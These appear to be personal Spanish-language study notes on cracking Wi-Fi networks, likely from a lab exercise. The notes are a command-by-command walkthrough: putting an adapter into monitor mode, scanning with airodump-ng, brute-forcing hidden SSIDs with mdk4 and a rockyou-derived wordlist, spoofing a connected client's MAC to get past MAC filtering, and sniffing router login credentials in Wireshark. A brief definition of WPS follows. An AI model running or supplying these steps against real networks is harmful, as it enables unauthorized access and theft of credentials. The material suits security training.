Linssid (cambiar canales de los wifi para que no coincidan)
## Cracking Wifi
- sudo airmon-ng start wlan0
- sudo airodump-ng wlan0mon -w ./scan --manufacturer --wps --band abg
- sudo airodump-ng wlan0mon -w ./scan11 --manufacturer --wps -c11
- cat /root/rockyou-top100000.txt | awk '{print "wifi-" $1}' > rockyou wifi
- iwconfig wlan0mon channel 11
- mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f rockyouwifi.txt
- creamos free.conf y ponemos:
	- network={
        ssid="wifi-free"
        key_mgmt=NONE
        scan_ssid=1
	 }
- wpa_supplicant -Dnl80211 -i wlan1 -c free.conf 
- dhclient wlan1 -v (en otra terminal)
- airodump-ng wlan0mon -w ./scan6 --manufacturer --wps -c6
- creamos open.conf y ponemos:
	- network={
        ssid="wifi-guest"
        key_mgmt=NONE
        scan_ssid=1
	 }
- wpa_supplicant -Dnl80211 -i wlan2 -c open.conf
- dhclient wlan2 -v (en otra terminal)
- airodump-ng wlan0mon -w ./wifi/scan6 --manufacturer --wps -c6
- ip link set wlan2 down
- macchanger -m B0:72:BF:44:B0:49  wlan2 (cogemos la MAC de alguno conectado al wifi)
- ip link set wlan2 up
- wpa_supplicant -Dnl80211 -i wlan2 -c open.conf
- dhclient wlan2 -v (en otra terminal)
- http && ip.dst == 192.168.10.1 (filtro en wireshark)
- En HTML, sale el usuario y contraseña
## WPS
Es un **método para conectar dispositivos a una red Wi-Fi fácilmente**, sin escribir la contraseña larga. Puede ser mediante un botón, PIN o NFC.

## Canal



